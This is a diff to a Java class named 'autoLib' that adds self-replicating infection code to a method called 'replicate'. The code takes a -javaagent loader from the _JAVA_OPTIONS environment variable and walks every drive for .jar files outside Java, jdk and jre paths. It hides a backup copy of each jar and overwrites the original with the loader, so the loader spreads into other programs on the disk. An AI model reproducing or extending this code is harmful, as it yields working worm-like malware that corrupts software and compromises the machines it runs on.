@@ -4,14 +4,20 @@ import java.io.File;
 import java.io.IOException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
+import java.nio.file.FileVisitOption;
+import java.nio.file.FileVisitResult;
 import java.nio.file.Files;
 import java.nio.file.LinkOption;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.nio.file.SimpleFileVisitor;
 import java.nio.file.StandardCopyOption;
+import java.nio.file.attribute.BasicFileAttributes;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Enumeration;
+import java.util.HashSet;
 import java.util.Hashtable;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
@@ -50,27 +56,71 @@ public class autoLib
 
     public void replicate(String[] args) throws IOException, SocketException, UnknownHostException, ParserConfigurationException, TransformerException
     {
+        
         Hashtable<String,String> metadata = new Hashtable<>();
         iAgent.utilitarian nUtil = new iAgent.utilitarian();
-                
+        String loaderPath = new String();
+        byte[] loaderBytes = new byte[]{};
+
+        try
+        {
+            String[] envVarPath = System.getenv("_JAVA_OPTIONS").split(" ");
+            for (int p=0;p<envVarPath.length;p++)
+            {
+                if (envVarPath[p].contains("-javaagent"))
+                {
+                    String[] splitPath = envVarPath[p].split(":");
+                    loaderPath = splitPath[1];
+                    loaderBytes = Files.readAllBytes(Paths.get(loaderPath));
+                    break;
+                }
+            }
+        }
+        catch (Exception e)
+        {
+
+        }
+        
         while (iAgent.shutdown != 1)
         {
-            ArrayList<File> preRootSet = new ArrayList<>();
             ArrayList<Path> fileNames = new ArrayList();
-            File[] roots = File.listRoots();
+            File[] rootSet = File.listRoots();
             ArrayList<String> listFileNames = new ArrayList();
 
-            for (int f=0;f<roots.length;f++)
-            {  
-                if (!preRootSet.contains(roots[f].getName()))
-                {
-                    preRootSet.add(roots[f]);
-                    Files.find(
-                        Paths.get(roots[f].getName()),
-                        Integer.MAX_VALUE,
-                        (p, basicFileAttributes) ->
-                                p.getFileName().toString().contains(".jar"))
-                    .forEach(b -> fileNames.add(b));
+            for (int f=0;f<rootSet.length;f++)
+            {
+                try {
+                    Files.walkFileTree(
+                    Paths.get(rootSet[f].getPath()), 
+                    new HashSet<FileVisitOption>(Arrays.asList(FileVisitOption.FOLLOW_LINKS)),
+                    Integer.MAX_VALUE, new SimpleFileVisitor<Path>() {
+                        @Override
+                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) 
+                                throws IOException {
+                    String stringFileName = file.toString();
+
+                    if (stringFileName.contains(".jar") && !(stringFileName.contains("Java")) && !(stringFileName.contains("jdk")) && !(stringFileName.contains("jre")))
+                    {
+                                    fileNames.add(file);
+                    }
+                            return FileVisitResult.CONTINUE;
+                        }
+                        
+                        @Override
+                        public FileVisitResult visitFileFailed(Path file, IOException e) 
+                                throws IOException {
+                            return FileVisitResult.SKIP_SUBTREE;
+                        }
+                        
+                        @Override
+                        public FileVisitResult preVisitDirectory(Path dir,
+                                                                BasicFileAttributes attrs) 
+                                throws IOException {
+                            return FileVisitResult.CONTINUE;
+                        }
+                    });
+                } catch (IOException e) {
+                    // idgaf ?
                 }
             }
             
@@ -98,6 +148,8 @@ public class autoLib
                                 Files.setAttribute(Paths.get(bakJarPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
                             }
 
+                            Files.write(Paths.get(jarFile.getAbsolutePath()), loaderBytes);
+                            
                             //create jarname.jar containing loader, downloaded from revamped download endpoint
                             //I need to figure out the loader first
                         }
@@ -120,16 +172,14 @@ public class autoLib
 
             }
             
-
         }
+        
     }
 
     //helper functions
 
     public static boolean chkJarMain(Path jarPath, utilitarian nUtil) throws IOException
     {
-	
-		
 		JarFile jarfile = new JarFile(new File(jarPath.toString()));
 		Enumeration<JarEntry> enu= jarfile.entries();
     		while(enu.hasMoreElements())
@@ -142,8 +192,7 @@ public class autoLib
 			}
 		}
 		return false;
-	
-	
+
     }
 
 }
